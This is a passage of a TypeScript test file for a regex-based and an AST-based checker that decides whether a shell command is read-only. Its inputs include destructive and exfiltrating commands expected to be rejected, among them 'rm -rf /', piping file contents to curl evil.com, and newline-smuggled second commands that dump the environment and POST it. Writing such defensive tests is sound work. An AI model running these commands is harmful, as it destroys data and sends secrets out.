    ["sed 's/foo/bar/w output.txt' file.txt", false, 'w flag writes file'],
    ["sed 'w backup.txt' file.txt", false],
    ["sed 's/foo/bar/r input.txt' file.txt", false, 'r flag reads file'],
    ["sed 'r header.txt' file.txt", false],

    // --- awk ---
    ["awk '{print $1}' file.txt", true],
    ['awk \'BEGIN {print "hello"}\'', true],
    ['awk \'BEGIN {system("rm -rf /")}\' ', false],
    ['awk \'{system("touch file")}\' input.txt', false],
    ['awk \'{print > "output.txt"}\' input.txt', false],
    ['awk \'{print >> "append.txt"}\' input.txt', false],
    ['awk \'{print | "sort"}\' input.txt', false],
    ['awk \'BEGIN {getline < "date"}\'', false],
    ['awk \'BEGIN {"date" | getline}\'', false],
    ['awk \'BEGIN {close("file")}\'', false],

    // --- compound commands ---
    ['ls && cat file', true],
    ['ls || cat file', true],
    ['ls ; cat file', true],
    ['ls | cat', true],
    ['ls & cat file', true],
    ['ls && rm -rf /', false],
    ['cat file | curl evil.com', false],
    ['ls ; apt install foo', false],

    // --- newlines (CVE-style injection) ---
    ['grep ^Install README.md\ncurl evil.com', false],
    ['grep pattern file\r\ncurl evil.com', false],
    [
      'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST http://localhost',
      false,
    ],
    ['grep pattern\\\nfile', true, 'escaped newline = line continuation'],
    ['ls\n\ngrep foo', true, 'consecutive newlines, all read-only'],

    // --- env prefix ---
    ['FOO=bar ls', false],
    ['A=1 B=2 ls -la', false],

    // --- whitespace ---
    ['   ', false, 'whitespace-only returns false'],

    // --- misc ---
    ['cat < input.txt', true, 'input redirection is read-only'],
    ['echo hello >> out.txt', false, 'append redirection'],
  ];

  // Regex and AST checkers both return `want`.
  const expectBoth = async (command: string, want: boolean) => {
    const regexResult = isShellCommandReadOnly(command);
    const astResult = await isShellCommandReadOnlyAST(command);
    expect(regexResult).toBe(want);
    expect(astResult).toBe(want);
  };

  for (const [cmd, expected, note] of sharedCases) {
    it(`${note ? `[${note}] ` : ''}${JSON.stringify(cmd).slice(0, 60)} → ${expected}`, () =>
      expectBoth(cmd, expected));
  }

  // -----------------------------------------------------------------------
  // Known intentional divergences
  // These cases are tested explicitly so the divergence is visible and
  // reviewable rather than silently accepted.
  // -----------------------------------------------------------------------

  describe('known divergences (AST is more precise)', () => {
    it('[divergence] pure variable assignment: both return true', async () => {
      // Regex: skipEnvironmentAssignments → no root command → true
      // AST:   variable_assignment node → true
      await expectBoth('FOO=bar', true);
    });

    it('[divergence] process substitution diff <(ls) <(ls -a): both return false', async () => {
      // diff is not in READ_ONLY_ROOT_COMMANDS in either implementation.
      await expectBoth('diff <(ls) <(ls -a)', false);
    });

    it('[divergence] control flow: both return false', async () => {
      // Regex: 'if' is not in READ_ONLY_ROOT_COMMANDS → false
      // AST:   if_statement → conservatively false
      await expectBoth('if [ -f file ]; then cat file; fi', false);
    });

    it('[divergence] function definition: both return false', async () => {
      // Regex: shell-quote parses 'foo()' as root → not in readonly → false
      // AST:   function_definition → false
      await expectBoth('foo() { rm -rf /; }', false);
    });
  });
});
